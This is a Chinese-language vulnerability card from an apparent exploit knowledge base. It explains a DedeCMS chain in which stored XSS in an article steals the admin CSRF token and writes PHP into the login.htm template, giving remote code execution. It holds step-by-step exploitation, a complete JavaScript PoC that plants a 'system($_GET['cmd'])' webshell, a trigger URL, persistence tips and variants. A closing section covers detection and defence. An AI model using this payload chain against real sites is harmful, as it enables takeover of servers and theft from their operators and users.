---
id: web-php-rce-dedecms-filemanage-htm-extension-blacklist-template-include
title: DedeCMS 文件管理编辑绕过扩展名黑名单写 .htm 模板：模板 include 执行 PHP，配合存储型 XSS 借管理员会话 getshell
type: scenario
domain: web
path: web/php/rce
technique: dedecms-file-manage-htm-template-include-xss-chain
aliases:
- file_manage_control.php 文件编辑
- activepath filename 过滤绕过
- .htm 模板写 PHP
- DedeInclude include htm
- dede_csrf_token cookie XSS
- 后台文件编辑 getshell
- DedeCMS 存储型 XSS 组合拳
tags:
- php
- dedecms
- cms
- file-write
- template-include
- extension-blacklist
- stored-xss
- csrf
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V660
  verified_at: '2026-11-13T06:50:44+08:00'
  notes: '已对照12454原文与全部12图核对：图01 catalog_add.php 的 include DedeInclude(''templets/catalog_add.htm'')；图02-04 file_manage_control.php edit 分支的 activepath 归一化、$filename str_replace(''..'') 与 #\.(php|pl|cgi|asp|aspx|jsp|php5|php4|php3|shtm|shtml)$#i 黑名单、$file="$cfg_basedir$activepath/$filename" 写文件均与卡片一致；图05 后台写 /admin/templets/ad_add.htm 含 phpinfo，图06 phpinfo 执行，图07 article_edit.php UPDATE 拼接、图08 CheckSQL、图10 Burp body 存储型 XSS、图11 弹窗、图12 phpinfo 全部对应。原文只出现环境 PHP 7.3.4/7.4.3，未标注 DedeCMS 受影响版本，故不设 affected_versions。dedup 与既有 makehtml/homepageset/template-tag/upload 类 DedeCMS 卡均非同链（本卡缺陷点为 file_manage_control edit 分支扩展名黑名单漏 .htm + 模板 include + XSS 借管理员会话）。PoC 未复跑。'
---

## 一句话结论

DedeCMS 后台文件编辑接口 `admin/file_manage_control.php` 只删除 `..` 并黑名单了 `php/pl/cgi/asp/aspx/jsp/php5/php4/php3/shtm/shtml`，未拦截 `.htm`；而系统模板通过 `include DedeInclude('templets/*.htm')` 直接执行，因此把 `<?php ... ?>` 写进 `/admin/templets/login.htm` 后访问 `/admin/login.php` 即执行；再结合文章正文的存储型 XSS 窃取 `dede_csrf_token` Cookie 并自动提交写文件请求，普通投稿用户即可借管理员审核触发未授权 RCE。

## 原理

- **写文件入口**：`file_manage_control.php` 的 `fmdo=edit` 分支先 `CheckCSRF()`，然后 `$filename = str_replace('..','',$filename)`，再用正则 `#\.(php|pl|cgi|asp|aspx|jsp|php5|php4|php3|shtm|shtml)$#i` 拒绝危险后缀；通过后 `$file = $cfg_basedir.$activepath.'/'.$filename; fopen($file,"w"); fwrite($fp,$str);`。过滤只针对 `..` 和上述后缀，`.htm` 被放行，且同一目录下可任选文件名。
- **为什么 .htm 能执行**：DedeCMS 的模板机制是 `include DedeInclude('templets/xxx.htm')`（如 `catalog_add.php`），`DedeInclude` 最终用 PHP `include` 引入模板文件。PHP 的 include 不看扩展名，只看文件内容里的 `<?php ?>` 标签，所以写入 `.htm` 的 PHP 代码在被 include 时执行。
- **为什么选 login.htm**：`/admin/login.php` 等后台入口会 include `/admin/templets/login.htm`，该文件路径可写、页面无需登录即可访问，写入后访问登录页即触发，形成稳定的 WebShell/代码执行点。
- **为什么要组合 XSS**：`file_manage_control.php` 位于 `/admin/` 且需要管理员会话；`article_edit.php` 的 UPDATE 语句把 `title/body` 等字段直接拼接（SQL 侧有 CheckSql 过滤），但正文未做 XSS 过滤，可插入 `<img src=1 onerror=...>` 的存储型 XSS。管理员审核/浏览该文章时脚本执行，读取非 HttpOnly 的 `dede_csrf_token` Cookie，并以管理员身份向 `file_manage_control.php` 提交写文件表单，从而把“需要后台权限”的写文件原语升级为“普通投稿用户 + 管理员一次浏览”即可触发的 RCE。
- **CSRF token 为何可被重放**：`CheckCSRF()` 校验的 `_csrf_token` 与 Cookie `dede_csrf_token` 对应，XSS 与目标同源、可读 Cookie 并原样回填，校验通过。

## 触发条件

- 目标为 DedeCMS，`/admin/file_manage_control.php` 的文件编辑功能存在上述过滤缺陷（`.htm` 未在黑名单）。
- 攻击者拥有可发布/编辑文档的低权限账号（或能通过其它写入点存入 XSS）。
- 文章正文/标题存在存储型 XSS，管理员会审核或浏览该内容。
- `dede_csrf_token` Cookie 可被 JS 读取（非 HttpOnly），管理员会话有效。
- `/admin/templets/login.htm` 可写，且 `/admin/login.php` 会 include 该模板。

## 利用步骤

1. 审计/定位：确认 `file_manage_control.php` 的 edit 分支只做 `..` 与危险后缀黑名单，`.htm` 放行；确认模板由 `include DedeInclude(...)` 引入。
2. 准备 XSS Payload：在文章正文插入 `<img src=1 onerror="eval(String.fromCharCode(...))">`，脚本内容为：读取 `document.cookie` 中的 `dede_csrf_token`，构造隐藏表单，向 `/admin/file_manage_control.php` POST `fmdo=edit&_csrf_token=<token>&activepath=/admin/templets&filename=login.htm&str=1<?php ...?>`。
3. 管理员审核/浏览文章触发 XSS，脚本以管理员身份提交写文件请求，把 PHP 代码写入 `/admin/templets/login.htm`。
4. 访问 `http://<target>/admin/login.php`，模板被 include，PHP 代码执行（本例 `phpinfo()` 验证，实际可写一句话/反弹 shell）。
5. 后续可用同一写入点覆盖其它模板文件维持访问，或写文件管理器以外的可执行文件。

## PoC

```javascript
// 存储型 XSS 中执行的脚本（示意：读取 CSRF token 并以管理员身份写 login.htm）
var url = document.URL;
var domain = url.match(/^(https?:\/\/[^/]+)/)[1];
var token = document.cookie.match(/dede_csrf_token=([^;]+)/)[1];
var form = document.createElement("form");
form.method = "POST";
form.action = domain + "/admin/file_manage_control.php";
var fields = {
  fmdo: "edit",
  _csrf_token: token,
  activepath: "/admin/templets",
  filename: "login.htm",
  str: "1<?php system($_GET['cmd']);?>"
};
for (var k in fields) {
  var i = document.createElement("input");
  i.type = "hidden"; i.name = k; i.value = fields[k];
  form.appendChild(i);
}
document.body.appendChild(form);
form.submit();
```

```text
# 触发后访问：
http://<target>/admin/login.php?cmd=id
```

## 变体与关联

- 变体：扩展名黑名单缺少 `.htm` 只是本例缺口；同类“文件编辑/模板编辑”接口若允许 `.inc`、`.tpl`、`.html`、`.txt` 且被 include/解析，同样可写码。
- 变体：路径过滤只删 `..` 时，若 `activepath` 允许绝对路径或其它编码（`%2e%2e`、`....//`），可扩大写入范围；本例不需要穿越，写同目录模板即可。
- 变体：管理员不浏览文章时，可用 CSRF 诱导点击、伪造审核页面或利用后台“文档审核”功能主动触发 XSS。
- 变体：同类链也可用“投稿作者可编辑文档 + 管理员模板管理”的其它 CMS 实现，核心是“低权限内容注入 → 高权限浏览器执行 → 高权限文件写入 → 模板 include 执行”。
- 关联：[[web-php-rce-dedecms-makehtml-homepage-position-file-write]]、[[web-php-rce-dedecms-homepageset-task-do-stored-file-write]]（DedeCMS 其它后台任意文件覆盖链）、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]（后台模板标签写码）、[[web-php-rce-kitecms-template-fileedit-path-traversal-write-read]]（模板编辑任意写读的其它 CMS 案例）、[[web-generic-xss-admin-session-csrf-file-upload-edit-rce]]（XSS+管理员会话写码的通用形态）。
- 边界：文件编辑接口增加 `.htm`/白名单与 `realpath` 校验、模板改用数据渲染而非 include、正文做 HTML 过滤、`dede_csrf_token` 设为 HttpOnly、管理员不浏览不可信内容时链路中断。

## 检测与防御

- 检测：`/admin/file_manage_control.php` 对 `.htm` 模板文件的写入请求与内容中出现 `<?php`；`/admin/templets/*.htm` 文件哈希变化；文章正文中的 `<img onerror>`/`<script>` 等 XSS 特征；管理员会话在短时间内写入模板后访问登录页。
- 防御：文件编辑只允许白名单后缀并做 `realpath` 前缀校验；模板文件与上传目录分离、模板目录对 Web 进程只读；正文输出编码与富文本白名单；CSRF token 使用 HttpOnly + 同源校验；管理员操作二次确认与操作审计。
